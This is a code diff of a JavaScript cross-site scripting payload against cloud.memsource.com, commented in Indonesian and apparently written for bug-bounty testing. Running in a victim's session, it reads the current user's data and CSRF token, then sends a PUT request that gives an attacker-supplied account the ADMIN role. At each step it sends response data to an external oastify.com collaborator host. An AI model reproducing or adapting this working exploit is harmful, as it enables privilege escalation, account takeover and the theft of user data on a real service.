@@ -3,44 +3,44 @@ fetch('https://cloud.memsource.com/web/internal/v1/users/current', {
     method: 'GET',
     credentials: 'include',
     headers: {
-        'Accept': 'application/json',
+        'Accept': 'application/json, text/plain, */*',
+        'X-User-Agent': 'memsource-web',
         'X-Requested-With': 'XMLHttpRequest'
     }
 })
-.then(response => response.json())
-.then(userData => {
-    // Extract CSRF token dari response JSON
-    // Biasanya ada di field 'csrfToken' atau 'token'
-    const csrfToken = userData.csrfToken || userData.token || userData.data?.csrfToken;
+.then(r => r.text())
+.then(t => {
+    // Parse JSON + handle multiple possible CSRF field names
+    let d = {};
+    try { d = JSON.parse(t); } catch(e) {}
     
-    if (!csrfToken) {
-        // Fallback: kirim ke server attacker untuk debug
-        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-log?step=csrf-not-found&data=' + encodeURIComponent(JSON.stringify(userData)));
+    // Extract CSRF dari berbagai kemungkinan field
+    const csrf = d.csrfToken || d.token || d._csrf || d.CSRF || 
+                 d.data?.csrfToken || d.data?.token || 
+                 (typeof d === 'string' && d.match(/csrfToken["']?\s*:\s*["']?([^"'\s,}]+)/)?.[1]);
+    
+    if (!csrf) {
+        // Debug: kirim struktur response yang diterima
+        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-log?step=csrf-not-found&raw=' + encodeURIComponent(t.substring(0, 500)));
         return;
     }
     
-    // Step 2: Kirim request untuk jadikan user sebagai ADMIN
-    // Note: TARGET_ID harus diganti dengan ID user attacker
-    // Contoh: yD6g4rpcvcbp9JCazqrxk1
-    const targetUserId = 'TARGET_USER_ID'; // GANTI INI
+    // Step 2: Kirim request jadikan ADMIN
+    // GANTI USER_ID dengan ID user Mas Aydil
+    const uid = 'USER_ID_DISINI';
     
-    fetch(`https://cloud.memsource.com/web/api2/v3/users/${targetUserId}`, {
+    fetch(`https://cloud.memsource.com/web/api2/v3/users/${uid}`, {
         method: 'PUT',
         credentials: 'include',
         headers: {
             'Content-Type': 'application/json',
-            'Accept': 'application/json, text/plain, */*',
-            'X-Csrf-Token': csrfToken,
+            'X-Csrf-Token': csrf,
             'X-User-Agent': 'memsource-web',
-            'Origin': 'https://cloud.memsource.com',
-            'Referer': `https://cloud.memsource.com/tms/user/edit/${targetUserId}`,
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin'
+            'Accept': 'application/json, text/plain, */*'
         },
         body: JSON.stringify({
             firstName: "evil",
-            lastName: "cathack", 
+            lastName: "cathack",
             email: "aydilfhr+evil@intigriti.me",
             userName: "aydilfhr+evil",
             role: "ADMIN",
@@ -49,18 +49,15 @@ fetch('https://cloud.memsource.com/web/internal/v1/users/current', {
             note: ""
         })
     })
-    .then(response => {
-        // Step 3: Kirim hasil ke server attacker untuk konfirmasi
-        return response.json().catch(() => ({ status: response.status }));
+    .then(r => r.text())
+    .then(t => {
+        // Log hasil - success atau error
+        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-result?status=ok&resp=' + encodeURIComponent(t.substring(0, 800)));
     })
-    .then(result => {
-        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-success?result=' + encodeURIComponent(JSON.stringify(result)));
-    })
-    .catch(error => {
-        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?message=' + encodeURIComponent(error.message));
+    .catch(e => {
+        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?step=admin&msg=' + encodeURIComponent(e.message));
     });
 })
-.catch(error => {
-    // Log error ke attacker server
-    fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?step=csrf-fetch&error=' + encodeURIComponent(error.message));
+.catch(e => {
+    fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?step=csrf&msg=' + encodeURIComponent(e.message));
 });
